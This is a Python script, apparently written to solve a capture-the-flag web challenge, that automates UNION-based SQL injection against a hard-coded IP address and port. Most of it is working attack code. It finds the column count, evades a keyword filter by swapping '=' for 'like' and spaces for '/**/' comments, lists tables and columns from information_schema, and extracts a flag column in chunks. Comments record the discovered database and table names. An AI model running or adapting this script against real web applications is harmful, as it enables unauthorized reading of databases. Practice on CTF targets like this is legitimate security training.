import os
import time
from pathlib import Path
import re

from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://1.14.71.254:28038/?wllm='
# flag_success = '欢迎'
failed_text = '非法'

fuzz_column_num = "-1' union select {}%23"
payload_base = "-1' UNion {} %23"
payload_database = "-1' UNion {} %23"
payload_table    = "(select group_concat(table_name) from information_schema.tables where table_schema like database())"
# payload_table    = "-1' UNion {} from information_schema.tables where table_schema=database()%23"
# payload_column   = "-1' UNion {} from information_schema.columns where table_name='{}'%23"
''
payload_column   = "(select group_concat(column_name) from information_schema.columns where table_name='{}')"
payload_data     = "-1' UNion {} from {}%23"
payload_data_right     = "-1' UNion {} from {}%23"

fuzz = {
    "=": " like ",
    " ": "/**/",
}
# key = "wllm"

start_time = time.time()
session = HTMLSession()
# session.proxies = {'http': 'http://localhost:8080'}


def get_cnum(payload):
    file = Path('sql_column_num')
    if file.exists() and time.time() - file.stat().st_ctime > 3600:   # 超过1小时删除
        file.unlink()
    if file.exists():
        return file.read_text()

    res = ''

    i = 0
    while not res or '5555' not in res.text:
        l = range(i + 1)
        txt = [f'5555{j}' for j in l]
        res = session.get(url + payload.format(','.join(txt)))
        i += 1


    pos = re.search('5555.',res.text).group()[-1]
    pos = int(pos)
    fill = ','.join(str(x) if x !=pos else '{}' for x in range(i))

    select = f'SELEct {fill}'
    open('sql_column_num', 'w').write(select)
    return select

import re
from re import escape
def go(title, payload):
    if fz := globals().get('fuzz', ''):
        for k, v in fz.items():
            payload = re.sub(escape(k), escape(v), payload, flags=re.IGNORECASE)
            payload = payload.replace('\\', '')
    if title == 'column_num':
        return get_cnum(payload)

    url_payload = url + payload
    res = session.get(url_payload)
    print(title, ' = ', res.text)


def init(select):
    global payload_database
    global payload_table
    global payload_column
    global payload_data
    global payload_data_right
    payload_database = payload_database.format(select).format('database()')
    payload_table = payload_base.format(select).format(payload_table)
    payload_column = payload_base.format(select).format(payload_column)
    payload_data = payload_data.format(select, '{}')
    # payload_data_right = payload_data_right.format(select, '{}').format('mid({},16,25)', {})
    payload_data_right = payload_data_right.format(select, '{}').format('mid({},26,25)', {})



    return


if __name__ == '__main__':
    table_name = 'LTLT_flag'
    column_name = 'flag'

    select = go('column_num', fuzz_column_num)
    init(select)
    # go('database', payload_database)  # 'kanwolongxia'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name))  # Id,flaglo
    # go('data', payload_data.format(column_name, table_name))
    go('data', payload_data_right.format(column_name, table_name))
    print("--- %s seconds ---" % (time.time() - start_time))
